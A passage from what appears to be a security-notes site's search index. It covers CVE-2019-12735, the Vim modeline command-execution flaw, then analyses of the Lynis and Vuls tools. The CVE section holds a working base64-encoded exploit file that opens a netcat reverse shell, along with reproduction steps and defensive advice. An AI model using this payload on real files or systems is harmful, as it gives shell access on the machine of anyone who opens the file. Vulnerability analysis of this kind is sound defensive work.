\u914d\u5408\\x1b[1G\u548c\\x1b[?7l\uff0c\u5220\u9664\u5f53\u524d\u4f4d\u7f6e\u5230\u884c\u9996\u7684\u5185\u5bb9(\u4e0d\u4f1a\u6539\u53d8\u6587\u672c\uff0c\u53ea\u6539\u53d8\u8f93\u51fa\u5185\u5bb9)\n  # \u7ecf\u8fc7\u8fd9\u4e2a\u5904\u7406\uff0ccat\u7684\u67e5\u770b\u7ed3\u679c\u5c31\u53ea\u5269\u4e0b\u540e\u9762\u7684\u4fe1\u606f\u4e86\n  # \u5177\u4f53\u5206\u6790\u548cDemo\u89c1\u9644\u4ef6 ANSI escape codes\u90e8\u5206\u3002  Nothing here.\" (c)\n  # \u51c6\u5907\u8ba9cat\u67e5\u770b\u6587\u4ef6\u8f93\u51fa\u7684\u5b57\u7b26\u4e32\uff0c\u4e0eVim\u6253\u5f00\u6587\u4ef6\u65f6\u67e5\u770b\u5230\u7684\u5185\u5bb9\u76f8\u540c  \\x16 (v)\n  # \u4f5c\u7528\u540c\u4e0a  \\x1b[2D (c) \n  # \u5149\u6807\u5411\u524d\u79fb\u52a82\u4f4d\n  # \u5177\u4f53\u5206\u6790\u548cDemo\u89c1\u9644\u4ef6 ANSI escape codes\u90e8\u5206\u3002  \\n (c&v)  # \u56e0\u4e3a\u5149\u6807\u524d\u79fb,\u4e24\u4e2a\u7a7a\u683c\u4f1a\u8986\u76d6Nothing here.\" \u5b57\u7b26\u4e32\u6700\u540e\u7684\u5f15\u53f7\"\u548c\\x16\n  # \u4e8e\u662fcat\u7684\u8f93\u51fa\u53ea\u5269\u4e0b \\x16Nothing here.\\n\n  # \\n\u6362\u884c\u89e6\u53d1 silent! w | ... | file | silent! [some text]  \u6574\u6761\u547d\u4ee4\u7684\u6267\u884c\n  # \u5176\u4e2dcall system\u5b8c\u6210\u7cfb\u7edf\u547d\u4ee4\u6267\u884c\u5efa\u7acb\u53cd\u5f39shell  ```",
            "title": "a.EXP\u539f\u7406"
        },
        {
            "location": "/cve-2019-12735/#bexp",
            "text": "\u539f\u4f5c\u8005exp:  shell.txt  \u4f18\u5316\u8fc7\u7684exp:   echo \"G1s/N2wbUyBOb3RoaW5nIGhlcmUuGzpzaWxlbnQhIHcgfCBjYWxsIHN5c3RlbSgnbm9odXAgbmMudHJhZGl0aW9uYWwgMTI3LjAuMC4xIDk5OTkgLWUgL2Jpbi9zaCAmJykgfCByZWRyYXchIHwgZmlsZSB8IHNpbGVudCEgIyAiIHZpbTogc2V0IGZlbiBmZG09ZXhwciBmZGU9YXNzZXJ0X2ZhaWxzKCdzZXRcIGZkZT14XCBcfFwgc291cmNlXCFcIFwlJykgZmRsPTA6IBYbWzFHFhtbMktOb3RoaW5nIGhlcmUuIhYbWzJEICAK\" | base64 --decode > exp.txt\n\n# base64\u7f16\u7801\u5bf9\u5e94\u7684\u660e\u6587\n\\x1b[?7l\\x1bS Nothing here.\\x1b:silent! w | call system(\\'nohup nc.traditional 127.0.0.1 9999 -e /bin/sh &\\') | redraw! | file | silent! # \" vim: set fen fdm=expr fde=assert_fails(\\'set\\\\ fde=x\\\\ \\\\|\\\\ source\\\\!\\\\ \\\\%\\') fdl=0: \\x16\\x1b[1G\\x16\\x1b[2KNothing here.\"\\x16\\x1b[2D  \\n\n\n# \u4fee\u6539\u4e86\u56db\u5904\n# \u4fee\u6539\u539f\u56e0\u89c1\u9644\u4ef6\n# nc -> nc.traditional \n# \\x1b[K -> \\x1b[2K \n# \\x1b[D -> \\x1b[2D \n#  \\n  ->   \\n (\u589e\u52a0\u4e86\u4e00\u4e2a\u7a7a\u683c)",
            "title": "b.EXP\u6e90\u7801"
        },
        {
            "location": "/cve-2019-12735/#c_1",
            "text": "\u642d\u5efa\u590d\u73b0\u73af\u5883\uff0c\u4e0ePoc\u76f8\u540c    \u7b2c\u4e00\u6b65\uff0c\u521b\u5efaexp\u6587\u4ef6    ```shell\n  $ echo \"G1s/N2wbUyBOb3RoaW5nIGhlcmUuGzpzaWxlbnQhIHcgfCBjYWxsIHN5c3RlbSgnbm9odXAgbmMudHJhZGl0aW9uYWwgMTI3LjAuMC4xIDk5OTkgLWUgL2Jpbi9zaCAmJykgfCByZWRyYXchIHwgZmlsZSB8IHNpbGVudCEgIyAiIHZpbTogc2V0IGZlbiBmZG09ZXhwciBmZGU9YXNzZXJ0X2ZhaWxzKCdzZXRcIGZkZT14XCBcfFwgc291cmNlXCFcIFwlJykgZmRsPTA6IBYbWzFHFhtbMktOb3RoaW5nIGhlcmUuIhYbWzJEICAK\" | base64 --decode > exp.txt  ```   \u7b2c\u4e8c\u6b65\uff0c\u76d1\u542cnc\u56de\u8fde\u7aef\u53e3   ```shell\n  $ nc -vlp 9999\n  Listening on [0.0.0.0] (family 0, port 9999)  ```   \u7b2c\u4e09\u6b65\uff0cVim\u6253\u5f00exp\u6587\u4ef6   ```shell\n  $ vim exp.txt\n   Nothing here.\n  ~                                                                     \n  ...                                                                    \n  ~                                                                              \n  \"exp.txt\" line 1 of 1 --100%-- col 14  ```   \u4f1a\u8bdd\u5efa\u7acb\u6210\u529f   ```shell\n  $ nc -vlp 9999\n  Listening on [0.0.0.0] (family 0, port 9999)\n  Connection from [127.0.0.1] port 9999 [tcp/*] accepted (family 2, sport 55824)\n  pwd\n  /home/invincible/Desktop/test/vim_test\n  id\n  uid=1000(invincible) gid=1000(invincible) groups=1000(invincible),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)  ```",
            "title": "c.\u590d\u73b0\u6b65\u9aa4"
        },
        {
            "location": "/cve-2019-12735/#d",
            "text": "Vim\u7684modeline\u53ef\u4ee5\u5728\u6587\u4ef6\u52a0\u8f7d\u65f6\u81ea\u52a8\u914d\u7f6e\uff1b    Vim\u8fdb\u884c\u914d\u7f6e\u65f6\u4f1a\u6267\u884cVim\u6307\u4ee4\uff0c\u800cVim\u7684\u67d0\u4e9b\u6307\u4ee4\u53c8\u80fd\u591f\u6267\u884c\u7cfb\u7edf\u7684Shell\u6307\u4ee4(\u901a\u8fc7fork+execvp/system)\uff1b    Vim\u7684\u5bf9\u53ef\u6267\u884c\u6307\u4ee4\u7684\u6761\u4ef6\u5ba1\u67e5\u4e0d\u4e25\u683c\uff0c\u5bfc\u81f4\u4efb\u610f\u547d\u4ee4\u6267\u884c\u3002",
            "title": "d.\u5229\u7528\u6838\u5fc3\u8981\u7d20"
        },
        {
            "location": "/cve-2019-12735/#5",
            "text": "\u7ed3\u5408\u6f0f\u6d1e\u539f\u7406\u548c\u5229\u7528\u539f\u7406\uff0c\u4ece\u9632\u62a4\u4ea7\u54c1\u7814\u53d1\u7684\u89d2\u5ea6\uff0c\u63d0\u51fa\uff1a   \u5982\u4f55\u68c0\u6d4b\u8fd9\u4e2a/\u7c7b\u6f0f\u6d1e  package\u7248\u672c\u68c0\u67e5\uff1a\u83b7\u53d6\u5f53\u524d\u7cfb\u7edfvim\u7684package\u7248\u672c\u4fe1\u606f\uff0c\u5bf9\u6bd4package\u7684changelog\u5224\u65ad\u5f53\u524d\u7248\u672c\u662f\u5426\u4fee\u590d\u4e86\u6f0f\u6d1e(\u5982\u679c\u662f\u624b\u52a8\u7f16\u8bd1\u53ef\u80fd\u5b58\u5728\u65e0\u6cd5\u83b7\u53d6package\u4fe1\u606f\u7684\u60c5\u51b5)\u5177\u4f53\u64cd\u4f5c\u89c1\u9644\u4ef6-\u6f0f\u6d1e\u9632\u62a4->package\u7248\u672c\u68c0\u67e5\u90e8\u5206  poc\u9a8c\u8bc1\uff1a\u624b\u52a8\u9a8c\u8bc1\uff0c\u4ee3\u7801\u6267\u884cvim\u8bfb\u53d6stdout\uff0c\u6216\u8005ptrace\u8bfb\u53d6\u8c03\u7528\u6808\u3002\u5177\u4f53\u89c1\u9644\u4ef6-\u6f0f\u6d1e\u9632\u62a4-> poc\u9a8c\u8bc1\u90e8\u5206\u3002  \u5982\u4f55\u9632\u5fa1\u8fd9\u4e2a/\u7c7b\u6f0f\u6d1e  \u66f4\u65b0\u8f6f\u4ef6\uff0c\u8fd9\u662f\u6700\u7b80\u5355\u901a\u7528\u7684\u65b9\u6cd5\uff1b  \u914d\u7f6e\u68c0\u67e5\uff0cDebian\u7b49\u4e00\u4e9b\u53d1\u884c\u7248\u5df2\u7ecf\u9ed8\u8ba4\u5173\u95ed\u4e86modeline\u7684\u914d\u7f6e\uff0c\u8fd9\u6837\u53ef\u4ee5\u5b8c\u5168\u9694\u65ad\u8be5\u6f0f\u6d1e\u7684\u5229\u7528\u8def\u5f84\uff0c\u5982\u679c\u9ed8\u8ba4\u6ca1\u6709\u5173\u95ed\uff0c\u5219\u9700\u8981\u624b\u52a8\u5173\u95ed\uff0c\u5177\u4f53\u914d\u7f6e\u65b9\u6cd5\u89c1 \u9644\u4ef6 -\u6f0f\u6d1e\u9632\u62a4-> \u914d\u7f6e\u68c0\u67e5\u90e8\u5206\uff1b  \u6587\u4ef6\u76d1\u63a7\uff0c\u5339\u914d\u6587\u4ef6\u9996\u90e8\u6216\u8005\u5c3e\u90e8\u662f\u5426\u7b26\u5408modeline\u7279\u5f81\uff0c\u5982\u679c\u7b26\u5408\uff0c\u4e14modeline\u4e2d\u5305\u542b\"source\"\u5b57\u7b26\u4e32\uff0c\u53ef\u4ee5\u53d1\u51fa\u8b66\u62a5(\u975e\u901a\u7528\u65b9\u6cd5\uff0c\u5bf9\u7cfb\u7edf\u6027\u80fd\u6709\u635f\u8017)\u3002  \u6709\u6ca1\u6709\u54ea\u79cd\u901a\u7528\u7684\u7f13\u89e3\u63aa\u65bd\u53ef\u4ee5\u963b\u65ad\u8fd9\u4e2a/\u7c7b\u6f0f\u6d1e  \u4ec5\u9488\u5bf9\u8be5\u6f0f\u6d1e\u7684\u901a\u7528\u7f13\u89e3\u63aa\u65bd\u5c31\u662f\u5173\u95edmodeline\u914d\u7f6e\uff1b  \u8be5\u7c7b\u6f0f\u6d1e\u5c5e\u4e8eOS\u547d\u4ee4\u6ce8\u5165\uff0c\u4e00\u822c\u662f\u901a\u8fc7\u76d1\u63a7system/fork/exec\u7b49\u7cfb\u7edf\u51fd\u6570\u53ef\u4ee5\u53d1\u73b0\u548c\u963b\u65ad\u5a01\u80c1(\u4f46\u662f\u5bf9\u7cfb\u7edf\u6027\u80fd\u6709\u635f\u8017)\u3002",
            "title": "5.\u9632\u62a4\u5efa\u8bae"
        },
        {
            "location": "/cve-2019-12735/#6",
            "text": "https://github.com/numirias/security/blob/master/doc/2019-06-04_ace-vim-neovim.mdhttps://imbawenzi.github.io/2019/08/03/vim/",
            "title": "6.\u53c2\u8003"
        },
        {
            "location": "/lynis\u5206\u6790/",
            "text": "lynis\u5206\u6790\n\n\n1. \u7b80\u4ecb\n\n\nLynis\u662f\u4e00\u4e2a\u5f00\u6e90\u7684\u5b89\u5168\u5de5\u5177, \u5e2e\u52a9\u7c7bUNIX\u7cfb\u7edf(Linux, macOS, BSD\u7b49)\u505a\u5b89\u5168\u5ba1\u8ba1(Security auditing), \u5408\u89c4\u68c0\u6d4b(Compliance testing , CIS, PCI, HIPAA, SOx)\uff0c\u6f0f\u6d1e\u68c0\u6d4b(Vulnerability detection)\uff0c\u5e76\u63d0\u4f9b\u7cfb\u7edf\u52a0\u56fa(System hardening)\u7684\u5efa\u8bae\u3002 \n\n\n2. \u4ee3\u7801\u67b6\u6784\n\n\n\n\n3. \u5177\u4f53\u529f\u80fd\n\n\n3.1 \u529f\u80fd\u6982\u8ff0\n\n\n\u5b98\u7f51\u4e0a\u5217\u51fa\u4e86\u90e8\u5206: \nhttps://cisofy.com/lynis/controls/\n\n\n\u5177\u4f53\u6267\u884c\u4e86\u54ea\u4e9b\u90fd\u5728\u6e90\u7801\u76ee\u5f55./include/tests_*\u4e2d\n\n\n\u603b\u5171\u6709\u8fd9\u4e9b\u7c7b\u522b: boot_services | kernel | memory_processes | authentication | shells | filesystems | usb | storage | storage_nfs | nameservices | dns | ports_packages | networking | printers_spools | mail_messaging | firewalls | webservers | ssh | snmp | databases | ldap | php | squid | logging | insecure_services | banners | scheduling | accounting | time | crypto | virtualization | containers | mac_frameworks | file_integrity | tooling | malware | file_permissions | homedirs | kernel_hardening | hardening \n\n\n\u6bd4\u5982filesystems\u4f1a\u505a\u4e00\u4e9b\u6587\u4ef6\u7cfb\u7edf\u7684\u68c0\u6d4b\uff1a\n\n\nFILE-6354  \u68c0\u6d4b/tmp\u76ee\u5f55\u4e0b\u9762\u662f\u5426\u6709\u8d85\u8fc7\u4e09\u4e2a\u6708\u7684\u6587\u4ef6\n\n\nFILE-6362  \u68c0\u6d4b/tmp\u76ee\u5f55\u662f\u5426\u8bbe\u7f6e\u4e86sticky bit\n\n\ntests_kernel\u4f1a\u505a\u4e00\u4e9b\u5185\u6838\u76f8\u5173\u7684\u68c0\u6d4b\uff1a\n\n\nKRNL-5677 \u6839\u636e/proc/cpuinfo\u67e5\u770b\u662f\u5426\u5f00\u542f\u4e86PAE\u548cNX\n\n\nKRNL-5723 \u68c0\u6d4b\u5185\u6838\u52a0\u8f7d\u7684\u6a21\u5757\n\n\ntests_malware\u4f1a\u68c0\u6d4b\u5b89\u88c5\u7684\u6740\u8f6f\uff1a\n\n\nMALW-3275 \u68c0\u6d4b\u662f\u5426\u5b89\u88c5\u4e86 chkrootkit\n\n\nMALW-3276 \u68c0\u6d4b\u662f\u5426\u5b89\u88c5\u4e86 Rootkit Hunter\n\n\ntests_logging \u4f1a\u505a\u7cfb\u7edf\u65e5\u5fd7\u76f8\u5173\u7684\u68c0\u6d4b\uff1a\n\n\nLOGG-2130 \u68c0\u6d4b\u662f\u5426\u8fd0\u884c\u4e86\u8fd9\u4e9bsyslog\u76f8\u5173\u7684\u5b88\u62a4\u8fdb\u7a0b(syslogd|syslog-ng|metalog|systemd-journa)\n\n\nLOGG-2148 \u4ecelogrotate\u7684\u914d\u7f6e\u6587\u4ef6/etc/logrotate.conf\u4e2d\u8bfb\u53d6\u6b63\u5728\u5904\u7406\u7684\u65e5\u5fd7\u6587\u4ef6\n\n\nLOGG-2180 \u68c0\u6d4blsof\u5f00\u542f\u7684\u65e5\u5fd7\u6587\u4ef6\n\n\n4.\u4e00\u4e9b\u5206\u6790\n\n\n4.1 \u975e\u4f01\u4e1a\u7248\u6ca1\u6709\u5408\u89c4\u68c0\u67e5\u529f\u80fd\n\n\n\u5728\u914d\u7f6e\u6587\u4ef6default.prf\u4e2d:\n\n\n######################################################################\n# Plugins\n# ---------------\n# Define which plugins are enabled\n# - ...\n# - Some are for Lynis Enterprise users only\n######################################################################\n\n\n# Lynis plugins to enable\n...\nplugin=compliance\n...\n######################################################################\n#\n# Lynis Enterprise options\n# ------------------------\n#\n######################################################################\n\n\n# Define which compliance standards are audited and reported on. Disable this if not required.\ncompliance-standards=cis,hipaa,iso27001,pci-dss\n\n\n\n\n\u8bf4\u660e\u8fd9\u4e2a\u5408\u89c4\u68c0\u6d4b\u529f\u80fd\u662f\u4f01\u4e1a\u7248\u624d\u6709\u7684\u3002\n\n\n\u9a8c\u8bc1\u4e86\u4e00\u4e0b\u53d1\u73b0\uff1a\n\n\ncompliance-standards\u8fd9\u4e2a\u9009\u9879\u5728include/profile\u4e2d\u8bfb\u53d6:\n\n\ncase ${OPTION} in\n...\n  allow-auto-purge)\n  ...\n  ;;\n  compliance_standards | compliance-standards | check-compliance)\u00a0 # deprecated: compliance_standards\n    COMPLIANCE_STANDARDS_ENABLED=$(echo ${VALUE} | tr ',' ' ')\n    or STANDARD in ${COMPLIANCE_STANDARDS_ENABLED}; do\n      case ${STANDARD} in\n         cis)\u00a0 \u00a0 \u00a0 COMPLIANCE_ENABLE_CIS=1\u00a0 \u00a0 \u00a0 ; Debug \"Compliance scanning for CIS Benchmarks is enabled\" ;;\n         ...\n       esac\n     done\n;;\n\n\n\n\n\u53d8\u91cfCOMPLIANCE_ENABLE_CIS\u53ea\u51fa\u73b0\u5728nclude/function\u6587\u4ef6\u7684ShowComplianceFinding\u51fd\u6570\u4e2d:\n\n\nShowComplianceFinding() {\n  ...\n  case ${STANDARD_NAME} in\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 cis)\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 if [ ${COMPLIANCE_ENABLE_CIS} -eq 1 ]; then SHOW=1; fi\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 STANDARD_FRIENDLY_NAME=\"CIS\"\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 ;;  \n}\n\n\n\n\n\u800c\u8fd9\u4e2a\u51fd\u6570\u5e76\u6ca1\u6709\u88ab\u4efb\u4f55\u6a21\u5757\u8c03\u7528\u8fc7\uff0c\u53ef\u89c1\u975e\u4f01\u4e1a\u7248\u786e\u5b9e\u6ca1\u6709\u5408\u89c4\u5ba1\u67e5\u7684\u529f\u80fd\u3002\n\n\n4.2 \u4e3b\u8981\u4f9d\u8d56\n\n\n\n\nLinux Audit System: auditd, auditctl\n\n\nSyslog: rsyslogd",
            "title": "Lynis\u5206\u6790"
        },
        {
            "location": "/lynis\u5206\u6790/#lynis",
            "text": "",
            "title": "lynis\u5206\u6790"
        },
        {
            "location": "/lynis\u5206\u6790/#1",
            "text": "Lynis\u662f\u4e00\u4e2a\u5f00\u6e90\u7684\u5b89\u5168\u5de5\u5177, \u5e2e\u52a9\u7c7bUNIX\u7cfb\u7edf(Linux, macOS, BSD\u7b49)\u505a\u5b89\u5168\u5ba1\u8ba1(Security auditing), \u5408\u89c4\u68c0\u6d4b(Compliance testing , CIS, PCI, HIPAA, SOx)\uff0c\u6f0f\u6d1e\u68c0\u6d4b(Vulnerability detection)\uff0c\u5e76\u63d0\u4f9b\u7cfb\u7edf\u52a0\u56fa(System hardening)\u7684\u5efa\u8bae\u3002",
            "title": "1. \u7b80\u4ecb"
        },
        {
            "location": "/lynis\u5206\u6790/#2",
            "text": "",
            "title": "2. \u4ee3\u7801\u67b6\u6784"
        },
        {
            "location": "/lynis\u5206\u6790/#3",
            "text": "",
            "title": "3. \u5177\u4f53\u529f\u80fd"
        },
        {
            "location": "/lynis\u5206\u6790/#31",
            "text": "\u5b98\u7f51\u4e0a\u5217\u51fa\u4e86\u90e8\u5206:  https://cisofy.com/lynis/controls/  \u5177\u4f53\u6267\u884c\u4e86\u54ea\u4e9b\u90fd\u5728\u6e90\u7801\u76ee\u5f55./include/tests_*\u4e2d  \u603b\u5171\u6709\u8fd9\u4e9b\u7c7b\u522b: boot_services | kernel | memory_processes | authentication | shells | filesystems | usb | storage | storage_nfs | nameservices | dns | ports_packages | networking | printers_spools | mail_messaging | firewalls | webservers | ssh | snmp | databases | ldap | php | squid | logging | insecure_services | banners | scheduling | accounting | time | crypto | virtualization | containers | mac_frameworks | file_integrity | tooling | malware | file_permissions | homedirs | kernel_hardening | hardening   \u6bd4\u5982filesystems\u4f1a\u505a\u4e00\u4e9b\u6587\u4ef6\u7cfb\u7edf\u7684\u68c0\u6d4b\uff1a  FILE-6354  \u68c0\u6d4b/tmp\u76ee\u5f55\u4e0b\u9762\u662f\u5426\u6709\u8d85\u8fc7\u4e09\u4e2a\u6708\u7684\u6587\u4ef6  FILE-6362  \u68c0\u6d4b/tmp\u76ee\u5f55\u662f\u5426\u8bbe\u7f6e\u4e86sticky bit  tests_kernel\u4f1a\u505a\u4e00\u4e9b\u5185\u6838\u76f8\u5173\u7684\u68c0\u6d4b\uff1a  KRNL-5677 \u6839\u636e/proc/cpuinfo\u67e5\u770b\u662f\u5426\u5f00\u542f\u4e86PAE\u548cNX  KRNL-5723 \u68c0\u6d4b\u5185\u6838\u52a0\u8f7d\u7684\u6a21\u5757  tests_malware\u4f1a\u68c0\u6d4b\u5b89\u88c5\u7684\u6740\u8f6f\uff1a  MALW-3275 \u68c0\u6d4b\u662f\u5426\u5b89\u88c5\u4e86 chkrootkit  MALW-3276 \u68c0\u6d4b\u662f\u5426\u5b89\u88c5\u4e86 Rootkit Hunter  tests_logging \u4f1a\u505a\u7cfb\u7edf\u65e5\u5fd7\u76f8\u5173\u7684\u68c0\u6d4b\uff1a  LOGG-2130 \u68c0\u6d4b\u662f\u5426\u8fd0\u884c\u4e86\u8fd9\u4e9bsyslog\u76f8\u5173\u7684\u5b88\u62a4\u8fdb\u7a0b(syslogd|syslog-ng|metalog|systemd-journa)  LOGG-2148 \u4ecelogrotate\u7684\u914d\u7f6e\u6587\u4ef6/etc/logrotate.conf\u4e2d\u8bfb\u53d6\u6b63\u5728\u5904\u7406\u7684\u65e5\u5fd7\u6587\u4ef6  LOGG-2180 \u68c0\u6d4blsof\u5f00\u542f\u7684\u65e5\u5fd7\u6587\u4ef6",
            "title": "3.1 \u529f\u80fd\u6982\u8ff0"
        },
        {
            "location": "/lynis\u5206\u6790/#4",
            "text": "",
            "title": "4.\u4e00\u4e9b\u5206\u6790"
        },
        {
            "location": "/lynis\u5206\u6790/#41",
            "text": "\u5728\u914d\u7f6e\u6587\u4ef6default.prf\u4e2d:  ######################################################################\n# Plugins\n# ---------------\n# Define which plugins are enabled\n# - ...\n# - Some are for Lynis Enterprise users only\n######################################################################\n\n\n# Lynis plugins to enable\n...\nplugin=compliance\n...\n######################################################################\n#\n# Lynis Enterprise options\n# ------------------------\n#\n######################################################################\n\n\n# Define which compliance standards are audited and reported on. Disable this if not required.\ncompliance-standards=cis,hipaa,iso27001,pci-dss  \u8bf4\u660e\u8fd9\u4e2a\u5408\u89c4\u68c0\u6d4b\u529f\u80fd\u662f\u4f01\u4e1a\u7248\u624d\u6709\u7684\u3002  \u9a8c\u8bc1\u4e86\u4e00\u4e0b\u53d1\u73b0\uff1a  compliance-standards\u8fd9\u4e2a\u9009\u9879\u5728include/profile\u4e2d\u8bfb\u53d6:  case ${OPTION} in\n...\n  allow-auto-purge)\n  ...\n  ;;\n  compliance_standards | compliance-standards | check-compliance)\u00a0 # deprecated: compliance_standards\n    COMPLIANCE_STANDARDS_ENABLED=$(echo ${VALUE} | tr ',' ' ')\n    or STANDARD in ${COMPLIANCE_STANDARDS_ENABLED}; do\n      case ${STANDARD} in\n         cis)\u00a0 \u00a0 \u00a0 COMPLIANCE_ENABLE_CIS=1\u00a0 \u00a0 \u00a0 ; Debug \"Compliance scanning for CIS Benchmarks is enabled\" ;;\n         ...\n       esac\n     done\n;;  \u53d8\u91cfCOMPLIANCE_ENABLE_CIS\u53ea\u51fa\u73b0\u5728nclude/function\u6587\u4ef6\u7684ShowComplianceFinding\u51fd\u6570\u4e2d:  ShowComplianceFinding() {\n  ...\n  case ${STANDARD_NAME} in\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 cis)\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 if [ ${COMPLIANCE_ENABLE_CIS} -eq 1 ]; then SHOW=1; fi\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 STANDARD_FRIENDLY_NAME=\"CIS\"\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 ;;  \n}  \u800c\u8fd9\u4e2a\u51fd\u6570\u5e76\u6ca1\u6709\u88ab\u4efb\u4f55\u6a21\u5757\u8c03\u7528\u8fc7\uff0c\u53ef\u89c1\u975e\u4f01\u4e1a\u7248\u786e\u5b9e\u6ca1\u6709\u5408\u89c4\u5ba1\u67e5\u7684\u529f\u80fd\u3002",
            "title": "4.1 \u975e\u4f01\u4e1a\u7248\u6ca1\u6709\u5408\u89c4\u68c0\u67e5\u529f\u80fd"
        },
        {
            "location": "/lynis\u5206\u6790/#42",
            "text": "Linux Audit System: auditd, auditctl  Syslog: rsyslogd",
            "title": "4.2 \u4e3b\u8981\u4f9d\u8d56"
        },
        {
            "location": "/vuls\u5206\u6790/",
            "text": "Vuls\u5206\u6790\n\n\n1. \u7b80\u4ecb\n\n\nvulns\u662f\u4e00\u4e2a\u57fa\u4e8ego\u8bed\u8a00\u7684\u5f00\u6e90\u6f0f\u6d1e\u626b\u63cf\u9879\u76ee\uff0c\u5b83\u80fd\u5bf9\u76ee\u6807\u4e3b\u673a\u7684\u5b89\u88c5\u5305\u3001\u5e93\u6587\u4ef6\u8fdb\u884c\u6f0f\u6d1e\u68c0\u6d4b\uff0c\u53e6\u5916\u8fd8\u652f\u6301Wordpress\u6f0f\u6d1e\u68c0\u6d4b\u3002\n\n\n2. \u67b6\u6784\u6982\u8ff0\n\n\nVuln\u7684\u67b6\u6784\u53ef\u4ee5\u5206\u4e3a\u4e09\u4e2a\u6a21\u5757\uff1a\u626b\u63cf\u6a21\u5757\uff0c\u6570\u636e\u5e93\u6a21\u5757\uff0c\u62a5\u544a\u751f\u6210\u6a21\u5757\u3002\n\n\n\n\n\u626b\u63cf\u6a21\u5757\u5305\u542b\uff1ascanPackages\u3001postScan\u3001scanWordPress\u3001scanLibraries\u51e0\u5927\u529f\u80fd\u3002\n\n\n\u6570\u636e\u5e93\u6a21\u5757\uff1a\u4e3b\u8981\u662f\u5b58\u50a8\u6f0f\u6d1e\u5e93\uff0c\u7528\u4e8e\u751f\u6210\u62a5\u544a\u3002\n\n\n\u62a5\u544a\u751f\u6210\u6a21\u5757\uff1a\u6839\u636e\u626b\u63cf\u6a21\u5757\u7684\u7ed3\u679c\uff0c\u7ed3\u5408\u6f0f\u6d1e\u6570\u636e\u5e93\u7684\u4fe1\u606f\u751f\u6210\u62a5\u544a\u3002\n\n\n\n\n3.\u529f\u80fd\u63cf\u8ff0\n\n\nscanPackages\n\n\n\u901a\u8fc7\u6267\u884cdpkg\uff0capt-get\u7b49\u547d\u4ee4\uff0c\u83b7\u53d6\u7cfb\u7edf\u7684\u6240\u6709\u5b89\u88c5\u5305\uff0c\u5e76\u901a\u8fc7\u62c9\u53d6\u8f6f\u4ef6\u5305changelog\uff0c\u4ee5\u6b63\u5219\u5339\u914d\u7684\u65b9\u5f0f\u63d0\u53d6\u5176\u4e2d\u7684\u6f0f\u6d1e\u76f8\u5173\u4fe1\u606f\u3002\n\n\npostScan\n\n\n\u641c\u96c6\u5b89\u88c5\u7684packages\u5bf9\u5f53\u524d\u8fd0\u884c\u7684\u8fdb\u7a0b\u7684\u5f71\u54cd\u3002\n\n\n\u901a\u8fc7\u6267\u884cshell\u6307\u4ee4\uff0c\u8bfb\u53d6/proc/pid/\u76ee\u5f55\u4e0b\u7684\u6570\u636e\uff0c\u83b7\u53d6\u5f53\u524d\u8fd0\u884c\u7684\u8fdb\u7a0b\u5217\u8868\u3001\u8fdb\u7a0b\u5bf9\u5e94\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u3001\u8fdb\u7a0b\u52a0\u8f7d\u7684\u6587\u4ef6\uff0c\u8fdb\u800c\u83b7\u53d6\u8fdb\u7a0b\u52a0\u8f7d\u7684package\u4fe1\u606f\uff0c\u7136\u540e\u6839\u636e\u5305\u540d\u5b8c\u5584scanPackages\u9636\u6bb5\u83b7\u53d6\u7684base.Packages\u5b57\u5178\u7684\u4fe1\u606f\uff0c\u8865\u5145Package\u5bf9\u8c61\u7684AffectedProcs\u5b57\u6bb5\uff0c\u5373\u8be5package\u5f71\u54cd\u7684\u8fdb\u7a0b\u3002\n\n\nscanWordPress\n\n\n\u4e3b\u8981\u662f\u901a\u8fc7\u6267\u884cwp\u547d\u4ee4\u83b7\u53d6Wordpress \u7248\u672c\u4fe1\u606f\uff0c\u5b89\u88c5\u7684\u4e3b\u9898\u76f8\u5173\u4fe1\u606f\uff0c\u5b89\u88c5\u7684\u63d2\u4ef6\u76f8\u5173\u4fe1\u606f\u3002\n\n\nscanLibraries\n\n\n\u57fa\u4e8e\u00a0aquasecurity\u9879\u76ee\u63d0\u4f9b\u7684fanal\u7b49\u5f00\u6e90\u5e93\u5bf9python\u3001ruby\u3001rust\u3001php\u3001node\u8bed\u8a00\u7684\u5de5\u7a0b\u9879\u76ee\u4e2d\u7684\u4f9d\u8d56\u5305\u4e2d\u63d0\u53d6\u4f9d\u8d56\u7684\u5e93\uff0c\u6839\u636e\u63d0\u53d6\u7684\u4fe1\u606f\u5339\u914d\u6f0f\u6d1e\u5e93\u5224\u65ad\u662f\u5426\u5b58\u5728\u6f0f\u6d1e\u3002\n\n\n4.\u4ee3\u7801\u5206\u6790\n\n\n4.1 \u4ee3\u7801\u67b6\u6784\n\n\n\n\n4.2 \u4ee3\u7801\u5206\u6790\n\n\n\u6838\u5fc3\u7684\u626b\u63cf\u903b\u8f91\n\n\nfunc GetScanResults(scannedAt time.Time, timeoutSec int) (results models.ScanResults, err error) {\n    parallelExec(func(o osTypeInterface) (err error) {\n        if !(config.Conf.LibsOnly || config.Conf.WordPressOnly) {\n            if err = o.preCure(); err != nil {\n                return err\n            }\n            if err = o.scanPackages(); err != nil {\n                return err\n            }\n            if err = o.postScan(); err != nil {\n                return err\n            }\n        }\n        if err = o.scanWordPress(); err != nil {\n            return xerrors.Errorf(\"Failed to scan WordPress: %w\", err)\n        }\n        if err = o.scanLibraries(); err != nil {\n            return xerrors.Errorf(\"Failed to scan Library: %w\", err)\n        }\n        return nil\n    }, timeoutSec)\n...\n\n\n\n\npostScan\u7684\u4e3b\u8981\u6267\u884c\u51fd\u6570\n\n\nfunc (o *debian) dpkgPs() error {\n    stdout, err := o.ps()\n    ...\n    pidNames := o.parsePs(stdout)\n    pidLoadedFiles := map[string][]string{}\n\n\n    for pid := range pidNames {\n        ...\n        stdout, err = o.lsProcExe(pid)\n        ...\n        s, err := o.parseLsProcExe(stdout)\n        ...\n        pidLoadedFiles[pid] = append(pidLoadedFiles[pid], s)\n        stdout, err = 